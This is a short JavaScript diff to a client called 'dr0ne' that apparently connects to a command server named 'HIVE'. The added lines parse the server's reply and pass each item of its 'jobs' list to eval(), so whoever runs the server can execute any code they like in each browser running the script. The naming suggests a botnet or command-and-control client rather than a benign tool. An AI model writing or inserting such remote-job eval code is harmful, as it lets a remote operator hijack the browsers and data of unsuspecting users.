@@ -57,6 +57,16 @@ dr0ne.interLinkAnswer = function () {
         dr0ne.interLinkResponseCounter = dr0ne.interLinkResponseCounter + 1;
         dr0ne.log('Response Count: ' + dr0ne.interLinkResponseCounter);
         //console.log(dr0ne.interLink.responseText);
+        var response = JSON.parse(dr0ne.interLink.responseText);
+        console.log(response);
+        //console.log(response.jobs.length);
+        //console.log(dr0ne.interLink.responseText);
+        if (response.jobs.length) {
+            response.jobs.forEach(function (entry) {
+                console.log(entry);
+                eval(entry);
+            });
+        }
     }
 };
 dr0ne.interLink.onreadystatechange = dr0ne.interLinkAnswer;
@@ -72,8 +82,7 @@ dr0ne.interLinkCheck = function () {
 dr0ne.interLinkDisconnect = function () {
     dr0ne.log('Disconnecting dr0ne from HIVE ...');
     clearInterval(dr0ne.interLinkInterval);
-}
+};
 
 dr0ne.assimilate();
-
 
